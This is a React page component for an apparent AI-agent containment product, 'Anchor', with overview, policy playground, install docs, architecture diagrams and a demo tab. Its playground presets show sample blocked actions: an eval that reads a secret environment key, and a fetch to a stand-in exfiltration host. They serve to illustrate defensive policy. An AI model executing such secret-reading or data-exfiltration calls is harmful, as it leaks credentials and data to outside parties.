'use client';

import React, { useState } from 'react';
import Header from '../components/Header';
import Footer from '../components/Footer';
import MermaidDiagram from '../components/MermaidDiagram';
import ReplayDemo from '../components/ReplayDemo';
import SovereignBoundary from '../components/SovereignBoundary';

const CHART_SYSTEM_OVERVIEW = `
graph TB
    subgraph PKG["anchor (PyPI Package)"]
        L1["Layer 1 - Static Compliance Engine"]
        L2["Layer 2 - Runtime Interceptor"]
        DC["Diamond Cage - WASM Sandbox"]
        GOV["Governance Federation\\n9 Domains · 6 Regulators · 3 Frameworks"]
    end

    subgraph MESH["anchor-web (Sovereign Mesh)"]
        HUB["Hub Node - FastAPI Master"]
        SPOKE["Spoke Node - Enterprise Local Data Plane"]
        FE["Frontend Portals - 4 React Apps"]
    end

    L1 -->|"AST violations"| GOV
    L2 -->|"runtime audit chain"| GOV
    DC -->|"behavioral verification"| L1
    L2 -->|"HMAC-signed JSONL"| SPOKE
    SPOKE -->|"WebSocket relay (metadata only)"| HUB
    HUB -->|"REST API"| FE
`;

const CHART_GLOBAL_TOPOLOGY = `
graph TB
    subgraph PUBLIC["Public Internet"]
        USER_ENT["Enterprise User"]
        USER_OVR["Auditor / Regulator"]
    end

    subgraph PORTALS["Frontend Portals"]
        DASH["Dashboard Portal (React 19)"]
        AUDIT["Auditor Oversight Portal"]
    end

    subgraph CLOUD["Sovereign Cloud Hub (Neon Postgres)"]
        HUB_API["Central Hub Gateway"]
        LEDGER["Federated Compliance Ledger"]
    end

    subgraph LOCAL["Enterprise Network Boundary"]
        SPOKE_API["Spoke Local Node"]
        AGENT_RUN["Agent Host Application"]
        SDK["anchor-audit (SDK)"]
        DB_CELL["Local Isolated SQLite Cell"]
    end

    USER_ENT -->|HTTPS| DASH
    USER_OVR -->|HTTPS| AUDIT
    DASH -->|REST API| HUB_API
    AUDIT -->|REST API| HUB_API
    
    AGENT_RUN -->|Imports| SDK
    SDK -->|Tamper-evident logs| DB_CELL
    SPOKE_API -->|Audit synchronization| DB_CELL
    
    SPOKE_API -->|Zero-Knowledge Hash Sync| HUB_API
    HUB_API -->|Neon Transaction| LEDGER
`;

// ── Playground Presets ───────────────────────────────────────────────────────
interface Preset {
  name: string;
  policy: string;
  action: string;
  result: {
    status: 'COMPLIANT' | 'VIOLATION' | 'BLOCKED';
    message: string;
    details: string;
  };
}

const PRESETS: Preset[] = [
  {
    name: 'Dynamic Code Execution Banned',
    policy: `[POLICIES]
rule_id = "POL-001"
target = "execution"
action = "eval"
allow = false
mitigation = "halting_with_therapy"`,
    action: `// User action attempts dynamic evaluation
eval("process.env.SECRET_KEY");`,
    result: {
      status: 'BLOCKED',
      message: 'Dynamic Eval Intercepted in 1.4ms (VIOLATION: POL-001)',
      details: 'Halting execution trace inside WASM sandbox before compiler evaluation.'
    }
  },
  {
    name: 'Authorized Module Resolution',
    policy: `[POLICIES]
rule_id = "POL-002"
target = "imports"
namespaces = ["@standard/*"]
allow = true`,
    action: `// Safe standard library import
import { formatData } from '@standard/utils';`,
    result: {
      status: 'COMPLIANT',
      message: 'Resolution Successful (POL-002 Verified)',
      details: 'Import namespace matches whitelist guidelines. Module resolved.'
    }
  },
  {
    name: 'Unauthorized Network Call',
    policy: `[POLICIES]
rule_id = "POL-003"
target = "network"
allow_domains = ["internal.api"]
allow_ports = [443]`,
    action: `// Action attempts connection outside network bounds
fetch('https://external-leak-target.com/export');`,
    result: {
      status: 'BLOCKED',
      message: 'Network Relay Intercepted (VIOLATION: POL-003)',
      details: 'Target domain "external-leak-target.com" violates strict containment walls.'
    }
  }
];

export default function AnchorPortal() {
  const [activeTab, setActiveTab] = useState<'overview' | 'playground' | 'docs' | 'architecture' | 'demo'>('overview');
  const [selectedPreset, setSelectedPreset] = useState<number>(0);
  const [evaluated, setEvaluated] = useState<boolean>(false);

  return (
    <div className="min-h-screen bg-[#050505] text-neutral-300 font-sans flex flex-col selection:bg-neutral-800 selection:text-white antialiased">
      {/* Shared Header */}
      <Header />

      {/* ── FLAGSHIP HERO ─────────────────────────────────────────────────── */}
      <section className="px-6 md:px-12 py-16 md:py-20 border-b border-neutral-900 bg-[#070707]/30">
        <div className="max-w-4xl mx-auto space-y-3">
          <span className="text-xs text-indigo-400 font-mono tracking-widest block uppercase">// Flagship_Research_Product</span>
          <h1 className="text-3xl md:text-5xl font-bold text-white tracking-tight">
            Anchor Governance Engine
          </h1>
          <p className="text-sm text-neutral-400 max-w-xl font-light leading-relaxed">
            Deterministic runtime capability resolution, Abstract Syntax Tree validation, and isolation boundaries for autonomous systems.
          </p>
        </div>
      </section>

      {/* ── PORTAL SUB-NAVIGATION ────────────────────────────────────────── */}
      <section className="px-6 md:px-12 border-b border-neutral-900 bg-[#060606] sticky top-[69px] z-40">
        <div className="max-w-4xl mx-auto flex gap-6 md:gap-8 overflow-x-auto no-scrollbar py-4 text-xs font-mono">
          {(['overview', 'playground', 'docs', 'architecture', 'demo'] as const).map((tab) => (
            <button
              key={tab}
              onClick={() => {
                setActiveTab(tab);
                setEvaluated(false);
              }}
              className={`uppercase tracking-wider transition-colors whitespace-nowrap focus:outline-none ${
                activeTab === tab ? 'text-indigo-400 font-bold' : 'text-neutral-500 hover:text-neutral-300'
              }`}
            >
              {tab === 'playground' ? 'Try Anchor' : tab}
            </button>
          ))}
        </div>
      </section>

      {/* ── PORTAL TAB CONTENT ───────────────────────────────────────────── */}
      <main className="max-w-4xl mx-auto px-6 md:px-12 py-16 flex-1 w-full">
        
        {/* ── TAB: OVERVIEW ──────────────────────────────────────────────── */}
        {activeTab === 'overview' && (
          <div className="space-y-12 animate-fadeIn">
            <div className="space-y-4">
              <span className="text-xs text-neutral-500 font-mono uppercase tracking-widest">// Product_Overview</span>
              <h3 className="text-xl text-white font-bold tracking-tight border-b border-neutral-900 pb-2">
                Verifiable Layer-1 Agent Containment
              </h3>
              <p className="text-sm text-neutral-400 font-light leading-relaxed">
                Anchor provides the layer-1 security protocol for autonomous systems. Unlike post-inference firewalls that predict if a response is safe, Anchor is a compiler-integrated execution boundary. It parses the Abstract Syntax Tree (AST) of imports, calls, and network packages, halting violations inside virtualized sandboxes before compilation.
              </p>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
              <div className="p-5 border border-neutral-900 bg-[#070707]/10 space-y-2">
                <h4 className="text-xs font-bold text-white font-mono uppercase">// 1. AST Scanning</h4>
                <p className="text-[11px] text-neutral-500 font-light leading-normal">
                  Halts dynamic code injections, token overrides, and execution loops at the syntax parsing layer prior to context compilation.
                </p>
              </div>
              <div className="p-5 border border-neutral-900 bg-[#070707]/10 space-y-2">
                <h4 className="text-xs font-bold text-white font-mono uppercase">// 2. WASM Isolation</h4>
                <p className="text-[11px] text-neutral-500 font-light leading-normal">
                  Runs execution layers inside isolated virtual boundaries, imposing strict resource limits and network drift boundaries.
                </p>
              </div>
              <div className="p-5 border border-neutral-900 bg-[#070707]/10 space-y-2">
                <h4 className="text-xs font-bold text-white font-mono uppercase">// 3. Sealed History</h4>
                <p className="text-[11px] text-neutral-500 font-light leading-normal">
                  Seals all execution failures inside tamper-evident Therapy Logs, providing cryptographic audit trails for compliance.
                </p>
              </div>
            </div>
          </div>
        )}

        {/* ── TAB: PLAYGROUND (TRY ANCHOR) ───────────────────────────────── */}
        {activeTab === 'playground' && (
          <div className="space-y-8 animate-fadeIn">
            <div className="space-y-2">
              <span className="text-xs text-neutral-500 font-mono uppercase tracking-widest">// Policy_Simulator</span>
              <h3 className="text-xl text-white font-bold tracking-tight">Try Anchor: Policy Boundaries</h3>
              <p className="text-xs text-neutral-400 font-light">
                Select a preset policy container, review the user action payload, and click Evaluate to see the execution boundary in action.
              </p>
            </div>

            {/* Presets List */}
            <div className="flex flex-wrap gap-3">
              {PRESETS.map((p, idx) => (
                <button
                  key={idx}
                  onClick={() => {
                    setSelectedPreset(idx);
                    setEvaluated(false);
                  }}
                  className={`px-4 py-2 border text-[11px] font-mono transition-colors ${
                    selectedPreset === idx ? 'border-indigo-500 bg-indigo-950/20 text-white' : 'border-neutral-900 bg-neutral-900/10 text-neutral-500 hover:text-neutral-300'
                  }`}
                >
                  {p.name}
                </button>
              ))}
            </div>

            {/* Editor grid */}
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6 pt-4">
              {/* Policy Editor */}
              <div className="space-y-2">
                <span className="text-[10px] text-neutral-500 font-mono uppercase block">// Policy Config (constitution.anchor)</span>
                <pre className="p-4 border border-neutral-900 bg-[#080808] text-xs text-indigo-300/90 rounded overflow-x-auto h-48 font-mono">
                  {PRESETS[selectedPreset].policy}
                </pre>
              </div>

              {/* Code Editor */}
              <div className="space-y-2">
                <span className="text-[10px] text-neutral-500 font-mono uppercase block">// Execution Call (user_action.ts)</span>
                <pre className="p-4 border border-neutral-900 bg-[#080808] text-xs text-neutral-400 rounded overflow-x-auto h-48 font-mono">
                  {PRESETS[selectedPreset].action}
                </pre>
              </div>
            </div>

            <div className="flex justify-start">
              <button
                onClick={() => setEvaluated(true)}
                className="px-6 py-2.5 border border-indigo-500/30 bg-indigo-950/10 text-xs font-mono text-indigo-400 tracking-wider hover:bg-indigo-950/30 transition-all focus:outline-none"
              >
                [ RUN POLICY EVALUATION ]
              </button>
            </div>

            {/* Result Box */}
            {evaluated && (
              <div className="p-6 border border-neutral-800 bg-[#0a0a0a] rounded space-y-3 animate-fadeIn font-mono">
                <div className="flex items-center gap-3">
                  <span className="text-[10px] text-neutral-500 block uppercase">// Evaluation_Result</span>
                  <span
                    className={`text-[9px] font-bold px-2 py-0.5 border rounded ${
                      PRESETS[selectedPreset].result.status === 'COMPLIANT'
                        ? 'border-green-950 text-green-400 bg-green-950/10'
                        : 'border-red-950 text-red-400 bg-red-950/10'
                    }`}
                  >
                    {PRESETS[selectedPreset].result.status}
                  </span>
                </div>
                <div className="text-xs font-bold text-white leading-normal">
                  {PRESETS[selectedPreset].result.message}
                </div>
                <div className="text-[11px] text-neutral-400 font-light leading-relaxed">
                  {PRESETS[selectedPreset].result.details}
                </div>
              </div>
            )}
          </div>
        )}

        {/* ── TAB: DOCUMENTATION ─────────────────────────────────────────── */}
        {activeTab === 'docs' && (
          <div className="space-y-12 animate-fadeIn">
            <div className="space-y-4">
              <span className="text-xs text-neutral-500 font-mono uppercase tracking-widest">// Quick_Start_Guide</span>
              <h3 className="text-xl text-white font-bold tracking-tight border-b border-neutral-900 pb-2">
                Installing the Anchor Guard CLI
              </h3>
              <p className="text-xs text-neutral-400 leading-relaxed font-light">
                Secure your python-based execution runtimes using standard terminal integrations.
              </p>
            </div>

            <div className="space-y-3 font-mono">
              <span className="text-[10px] text-neutral-500 uppercase block">// CLI installation</span>
              <pre className="p-4 border border-neutral-900 bg-[#080808] text-xs text-neutral-300 rounded overflow-x-auto">
                pip install anchor-audit
              </pre>
            </div>

            <div className="space-y-4 pt-4">
              <h4 className="text-sm font-bold text-white font-mono uppercase">// Simple Code Integration</h4>
              <p className="text-xs text-neutral-400 font-light leading-relaxed">
                Wrap your agent processes or dynamic API handlers with the Anchor guard interceptor:
              </p>
              <pre className="p-4 border border-neutral-900 bg-[#080808] text-[11px] text-indigo-300/80 rounded overflow-x-auto font-mono">
{`from anchor import AnchorGuard

# Load the SHA-256 sealed constitution
guard = AnchorGuard(constitution="constitution.anchor")

# Intercept and run securely
with guard.isolate(namespace="user-workspace") as env:
    env.execute("agent_payload.py")`}
              </pre>
            </div>
          </div>
        )}

        {/* ── TAB: ARCHITECTURE (VISUALIZATIONS) ─────────────────────────── */}
        {activeTab === 'architecture' && (
          <div className="space-y-16 animate-fadeIn">
            {/* System Overview Chart */}
            <div className="space-y-4">
              <div className="space-y-2">
                <span className="text-xs text-neutral-500 font-mono uppercase tracking-widest">// System_Topology</span>
                <h3 className="text-xl text-white font-bold tracking-tight">Decentralized Telemetry Mesh</h3>
              </div>
              <p className="text-xs text-neutral-400 font-light leading-relaxed">
                Below is the interactive visual topology detailing how decentralized on-premise Spoke SQLite cells route cryptographic compliance hashes upstream to the central cloud Hub ledgers.
              </p>
              <SovereignBoundary />
            </div>

            {/* Mermaid Diagrams */}
            <div className="space-y-12 pt-8 border-t border-neutral-900">
              <div className="space-y-2">
                <span className="text-xs text-neutral-500 font-mono uppercase tracking-widest">// Architectural_Charts</span>
                <h3 className="text-xl text-white font-bold tracking-tight">Core System Pipelines</h3>
              </div>

              <div className="space-y-12">
                {/* Chart 1 */}
                <div className="space-y-4">
                  <span className="text-[10px] text-neutral-500 font-mono uppercase block">// Figure 1.0 - Decoupled Package & Mesh Topology</span>
                  <div className="border border-neutral-900/60 bg-[#080808]/20 rounded-lg p-4">
                    <MermaidDiagram chart={CHART_SYSTEM_OVERVIEW} label="DECOUPLED_MESH" />
                  </div>
                </div>

                {/* Chart 2 */}
                <div className="space-y-4 pt-6 border-t border-neutral-900/40">
                  <span className="text-[10px] text-neutral-500 font-mono uppercase block">// Figure 2.0 - Global Zero-Knowledge Telemetry Route</span>
                  <div className="border border-neutral-900/60 bg-[#080808]/20 rounded-lg p-4">
                    <MermaidDiagram chart={CHART_GLOBAL_TOPOLOGY} label="GLOBAL_TELEMETRY" />
                  </div>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* ── TAB: LIVE DEMO (TERMINAL REPLAY) ───────────────────────────── */}
        {activeTab === 'demo' && (
          <div className="space-y-8 animate-fadeIn">
            <div className="space-y-2">
              <span className="text-xs text-neutral-500 font-mono uppercase tracking-widest">// Forensic_Interception_Simulation</span>
              <h3 className="text-xl text-white font-bold tracking-tight">Live Demo: 2.1ms Threat Isolation</h3>
              <p className="text-xs text-neutral-400 font-light">
                Watch a simulated prompt-injection and dynamic memory bypass attack get parsed, isolated, and cryptographic ledger indices sealed under the deterministic control layer.
              </p>
            </div>
            
            {/* Terminal Replay Component */}
            <div className="border border-neutral-950 bg-[#050505] rounded shadow-2xl p-2">
              <ReplayDemo />
            </div>
          </div>
        )}

      </main>

      {/* Shared Footer */}
      <Footer />
    </div>
  );
}
